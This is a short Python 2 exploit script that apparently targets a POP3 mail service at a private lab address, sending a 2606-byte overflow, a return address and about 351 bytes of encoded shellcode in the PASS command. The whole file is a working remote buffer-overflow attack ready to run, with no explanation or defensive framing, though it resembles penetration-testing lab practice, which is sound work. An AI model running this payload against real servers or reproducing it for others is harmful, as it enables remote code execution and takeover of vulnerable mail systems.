#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

shell = (
"\xba\xe3\x3f\xbb\x24\xd9\xce\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x0e\x03\xb0\x31\x59\xd1\xca\xa6\x1f"
"\x1a\x32\x37\x40\x92\xd7\x06\x40\xc0\x9c\x39\x70\x82\xf0\xb5"
"\xfb\xc6\xe0\x4e\x89\xce\x07\xe6\x24\x29\x26\xf7\x15\x09\x29"
"\x7b\x64\x5e\x89\x42\xa7\x93\xc8\x83\xda\x5e\x98\x5c\x90\xcd"
"\x0c\xe8\xec\xcd\xa7\xa2\xe1\x55\x54\x72\x03\x77\xcb\x08\x5a"
"\x57\xea\xdd\xd6\xde\xf4\x02\xd2\xa9\x8f\xf1\xa8\x2b\x59\xc8"
"\x51\x87\xa4\xe4\xa3\xd9\xe1\xc3\x5b\xac\x1b\x30\xe1\xb7\xd8"
"\x4a\x3d\x3d\xfa\xed\xb6\xe5\x26\x0f\x1a\x73\xad\x03\xd7\xf7"
"\xe9\x07\xe6\xd4\x82\x3c\x63\xdb\x44\xb5\x37\xf8\x40\x9d\xec"
"\x61\xd1\x7b\x42\x9d\x01\x24\x3b\x3b\x4a\xc9\x28\x36\x11\x86"
"\x9d\x7b\xa9\x56\x8a\x0c\xda\x64\x15\xa7\x74\xc5\xde\x61\x83"
"\x2a\xf5\xd6\x1b\xd5\xf6\x26\x32\x12\xa2\x76\x2c\xb3\xcb\x1c"
"\xac\x3c\x1e\xb2\xfc\x92\xf1\x73\xac\x52\xa2\x1b\xa6\x5c\x9d"
"\x3c\xc9\xb6\xb6\xd7\x30\x51\xb3\x2c\x3a\x98\xab\x30\x3a\xdb"
"\x90\xbc\xdc\xb1\xf6\xe8\x77\x2e\x6e\xb1\x03\xcf\x6f\x6f\x6e"
"\xcf\xe4\x9c\x8f\x9e\x0c\xe8\x83\x77\xfd\xa7\xf9\xde\x02\x12"
"\x95\xbd\x91\xf9\x65\xcb\x89\x55\x32\x9c\x7c\xac\xd6\x30\x26"
"\x06\xc4\xc8\xbe\x61\x4c\x17\x03\x6f\x4d\xda\x3f\x4b\x5d\x22"
"\xbf\xd7\x09\xfa\x96\x81\xe7\xbc\x40\x60\x51\x17\x3e\x2a\x35"
"\xee\x0c\xed\x43\xef\x58\x9b\xab\x5e\x35\xda\xd4\x6f\xd1\xea"
"\xad\x8d\x41\x14\x64\x16\x71\x5f\x24\x3f\x1a\x06\xbd\x7d\x47"
"\xb9\x68\x41\x7e\x3a\x98\x3a\x85\x22\xe9\x3f\xc1\xe4\x02\x32"
"\x5a\x81\x24\xe1\x5b\x80")

buffer = 'A' * 2606 + '\x8F\x35\x4a\x5f' + shell + 'C' * (3500-2606-4-351)

try:
  print "\nSending evil buffer..." 
  s.connect(('10.11.10.125',110)) 
  data = s.recv(1024)
  s.send('USER username' +'\r\n') 
  data = s.recv(1024)
  s.send('PASS ' + buffer + '\r\n')
  print "\nDone!." 
except:
  print "Could not connect to POP3!"
